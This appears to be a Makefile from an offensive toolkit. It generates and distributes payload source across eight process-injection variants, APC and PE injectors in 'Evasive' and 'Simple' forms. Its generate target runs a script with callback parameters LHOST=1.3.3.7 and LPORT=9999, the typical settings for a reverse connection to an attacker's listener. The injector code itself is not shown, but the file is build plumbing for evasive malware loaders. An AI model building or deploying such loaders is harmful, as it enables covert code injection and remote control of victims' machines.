SOURCE = base.cpp
TARGETS = Evasive/APC-Injector-Monolithic/ \
         Evasive/APC-Injector/ \
         Evasive/PE-Injector-Monolithic/ \
         Evasive/PE-Injector/ \
         Simple/APC-Injector-Monolithic/ \
         Simple/APC-Injector/ \
         Simple/PE-Injector-Monolithic/ \
         Simple/PE-Injector/

# Generate action to run the generate script
generate:
	@echo "Running generate script with LHOST, HOSTNAME, LPORT..."
	@LHOST=1.3.3.7 HOSTNAME=Windows10 LPORT=9999 ./generate.sh
	@echo "Generate script executed successfully!"

# The copy action
copy: $(TARGETS)
	@for dir in $(TARGETS); do \
		if [ ! -d "$$dir" ]; then \
			mkdir -p "$$dir"; \
		fi; \
		cp $(SOURCE) "$$dir"; \
		echo "Copied $(SOURCE) to $$dir"; \
	done

# The clean action
clean:
	@for dir in $(TARGETS); do \
		rm -f "$$dir""$(SOURCE)"; \
		echo "Deleted ""$$dir""$(SOURCE)"; \
	done
	@rm -f base.cpp base.dll
	@echo "Deleted root defined base.cpp and base.dll"



# Default target: run generate first, then copy the base.cpp file to all locations
all: generate copy

